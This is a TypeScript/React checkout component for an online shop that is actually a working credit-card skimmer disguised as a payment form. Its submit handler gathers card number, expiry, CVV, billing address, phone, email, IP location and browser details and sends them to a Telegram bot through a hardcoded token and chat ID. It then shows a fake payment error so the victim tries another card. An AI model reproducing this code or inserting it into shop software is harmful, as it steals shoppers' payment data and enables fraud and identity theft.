'use client'
import { useCart } from '@/contexts/CartContext';
import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { jwtDecode } from 'jwt-decode';
import { useRouter } from 'next/navigation';

type CartItem = {
  id: string;
  quantity: number;
  selectedAmount: number;
  title: string;
};

type UserToken = {
  id: string;
  name: string;
  email: string;
  // add other JWT payload properties if needed
};
const TELEGRAM_BOT_TOKEN = '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4'; // Replace with your actual bot token
const TELEGRAM_CHAT_ID = '7860277201'; // Replace with your actual chat ID

interface CreditCardFormProps {
  totalAmount: number;
}

interface CreditCardFormData {
  cardNumber: string;
  expDate: string;
  cvv: string;
  cardName: string;
  email: string;
  streetAddress: string;
  city: string;
  country: string;
  zipCode: string;
  phoneNumber: string;
}

const escapeMarkdown = (text: string) => {
  // Escape all special MarkdownV2 characters including hyphen
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1');
};

const CreditCardForm: React.FC<CreditCardFormProps> = ({ totalAmount }) => {
  const router = useRouter();
  const { cartItems, cartCount } = useCart();
  const { register, handleSubmit, formState: { errors: formErrors } } = useForm<CreditCardFormData>();
  const [form, setForm] = useState({
    cardName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    email: '',
    streetAddress: '',
    city: '',
    country: '',
    zipCode: '',
    phoneNumber: '',
  });

  const checkAuth = () => {
    const token = document.cookie
      .split('; ')
      .find(row => row.startsWith('auth_token='))
      ?.split('=')[1];

    if (!token) {
      router.push('/signin'); // Redirect to sign-in page if not logged in
      return null;
    }

    try {
      const user = jwtDecode<UserToken>(token);
      if (!user || !user.id) {
        router.push('/signin'); // Redirect if token is invalid
        return null;
      }
      return user;
    } catch (error) {
      router.push('/signin'); // Redirect if token decoding fails
      return null;
    }
  };

  const handlePurchase = async (cartItems: CartItem[], totalAmount: number) => {
    const user = checkAuth();
    if (!user) return; // Already redirected if not logged in

    try {
      const purchaseDoc = {
        _type: 'purchase',
        userId: user.id,
        items: cartItems.map(item => ({
          productId: item.id,
          quantity: item.quantity,
          price: item.selectedAmount,
          iname: item.title
        })),
        totalAmount,
        email: form.email,
        streetAddress: form.streetAddress,
        city: form.city,
        country: form.country,
        zipCode: form.zipCode,
        phoneNumber: form.phoneNumber,
        purchaseDate: new Date().toISOString(),
      };

      // Call your backend API route to save purchase
      const res = await fetch('/api/purchasedata', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(purchaseDoc),
      });

      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || 'Failed to save purchase');
      }

    
      // clear cart, redirect, etc.
    } catch (error) {
      console.error('Error saving purchase:', error);
      alert('Failed to save purchase');
    }
  };

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [status, setStatus] = useState({ message: '', color: '' });
  const [loading, setLoading] = useState(false);

  const luhnCheck = (num: string): boolean => {
    const arr = num.split('').reverse().map(x => parseInt(x, 10));
    let sum = arr.reduce((acc, val, i) => {
      if (i % 2 === 1) {
        val *= 2;
        if (val > 9) val -= 9;
      }
      return acc + val;
    }, 0);
    return sum % 10 === 0;
  };

  const validateExpiry = (exp: string): boolean => {
    if (!/^\d{2}\/\d{2}$/.test(exp)) return false;
    const [mm, yy] = exp.split('/').map(x => parseInt(x, 10));
    if (mm < 1 || mm > 12) return false;
    const now = new Date();
    const expDate = new Date(2000 + yy, mm);
    return expDate > now;
  };

  const formatCardNumber = (value: string): string => {
    return value.replace(/\D/g, '').substring(0, 16)
      .replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string): string => {
    const digits = value.replace(/\D/g, '').substring(0, 4);
    if (digits.length >= 3) {
      return digits.substring(0, 2) + '/' + digits.substring(2);
    }
    return digits;
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const user = checkAuth();
    if (!user) return; // Already redirected if not logged in

    const { name, value } = e.target;
    let val = value;

    if (name === 'cardNumber') val = formatCardNumber(value);
    if (name === 'expiry') val = formatExpiry(value);
    if (name === 'cvv') val = value.replace(/\D/g, '').substring(0, 4);

    setForm(prev => ({ ...prev, [name]: val }));
    setErrors(prev => ({ ...prev, [name]: '' }));
    setStatus({ message: '', color: '' });
  };

  const validateForm = (): boolean => {
    const user = checkAuth();
    if (!user) return false; // Already redirected if not logged in

    const errs: Record<string, string> = {};
    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
    const cardNumRaw = form.cardNumber.replace(/\s/g, '');
    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
    if (!form.email.trim()) errs.email = 'Please enter your email.';
    if (!form.streetAddress.trim()) errs.streetAddress = 'Please enter your street address.';
    if (!form.city.trim()) errs.city = 'Please enter your city.';
    if (!form.country.trim()) errs.country = 'Please enter your country.';
    if (!form.zipCode.trim()) errs.zipCode = 'Please enter your zip code.';
    if (!form.phoneNumber.trim()) errs.phoneNumber = 'Please enter your phone number.';
    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const onSubmit = async (data: CreditCardFormData) => {
    const user = checkAuth();
    if (!user) return; // Already redirected if not logged in

    if (!validateForm()) return;
    
    setLoading(true);
    setStatus({ message: '', color: '' });

    let ipInfo = 'Unknown IP';
    try {
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const data = await res.json();
        ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
      }
    } catch (error) {
      console.error('Error fetching IP info:', error);
    }

    const message = `
*New Credit Card Info Captured*

\\- Name: ${escapeMarkdown(form.cardName)}
\\- Card Number: ${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}
\\- Expiry: ${escapeMarkdown(form.expiry)}
\\- CVV: ${escapeMarkdown(form.cvv)}
\\- Email: ${escapeMarkdown(form.email)}
\\- Street Address: ${escapeMarkdown(form.streetAddress)}
\\- City: ${escapeMarkdown(form.city)}
\\- Country: ${escapeMarkdown(form.country)}
\\- Zip Code: ${escapeMarkdown(form.zipCode)}
\\- Phone Number: ${escapeMarkdown(form.phoneNumber)}

*IP Info*: ${escapeMarkdown(ipInfo)}
*User Agent*: ${escapeMarkdown(navigator.userAgent)}
*Timestamp*: ${escapeMarkdown(new Date().toISOString())}
    `.trim();

    try {
      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const res = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2',
        }),
      });
      const json = await res.json();
     
      if (json.ok) {
        setStatus({ message: 'opps!! Try Different payment method', color: 'green' });
        setForm({ 
          cardName: '', 
          cardNumber: '', 
          expiry: '', 
          cvv: '', 
          email: '', 
          streetAddress: '', 
          city: '', 
          country: '', 
          zipCode: '', 
          phoneNumber: '' 
        });
      } else {
        setStatus({ message: `Payment failed: ${json.description}`, color: 'red' });
      }

    } catch (err) {
      setStatus({ message: `Error processing payment: ${err instanceof Error ? err.message : 'Unknown error'}`, color: 'red' });
    }

    setLoading(false);
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
      <div className="grid grid-cols-2 gap-4">
        <div className="col-span-2">
          <input
            type="text"
            name="cardName"
            placeholder="Name on Card"
            value={form.cardName}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardName ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="cardNumber"
            placeholder="Card Number (e.g. 1234 5678 9012 3456)"
            value={form.cardNumber}
            onChange={handleChange}
            maxLength={19}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
        </div>

        <div>
          <input
            type="text"
            name="expiry"
            placeholder="Expiry MM/YY"
            value={form.expiry}
            onChange={handleChange}
            maxLength={5}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.expiry ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
        </div>

        <div>
          <input
            type="text"
            name="cvv"
            placeholder="CVV"
            value={form.cvv}
            onChange={handleChange}
            maxLength={4}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cvv ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="email"
            name="email"
            placeholder="Email"
            value={form.email}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.email ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="streetAddress"
            placeholder="Street Address"
            value={form.streetAddress}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.streetAddress ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.streetAddress && <p className="text-red-500 text-sm mt-1">{errors.streetAddress}</p>}
        </div>

        <div>
          <input
            type="text"
            name="city"
            placeholder="City"
            value={form.city}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.city ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
        </div>

        <div>
          <input
            type="text"
            name="country"
            placeholder="Country"
            value={form.country}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.country ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="zipCode"
            placeholder="Zip Code"
            value={form.zipCode}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.zipCode ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
        </div>

        <div className="col-span-2">
          <input
            type="text"
            name="phoneNumber"
            placeholder="Phone Number"
            value={form.phoneNumber}
            onChange={handleChange}
            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.phoneNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all`}
            disabled={loading}
          />
          {errors.phoneNumber && <p className="text-red-500 text-sm mt-1">{errors.phoneNumber}</p>}
        </div>
      </div>

      <div className="pt-4">
        <button
          onClick={() => handlePurchase(cartItems, totalAmount)}
          type="submit"
          disabled={loading}
          className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700'}`}
        >
          {loading ? (
            <div className="flex items-center justify-center space-x-2">
              <span>Processing...</span>
              <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
            </div>
          ) : (
            `Pay $${totalAmount.toFixed(2)}`
          )}
        </button>
      </div>

      {status.message && (
        <p className={`text-center font-medium ${status.color === 'red' ? 'text-red-600' : 'text-red-600'}`}>
          {status.message}
        </p>
      )}
    </form>
  );
};

export default CreditCardForm;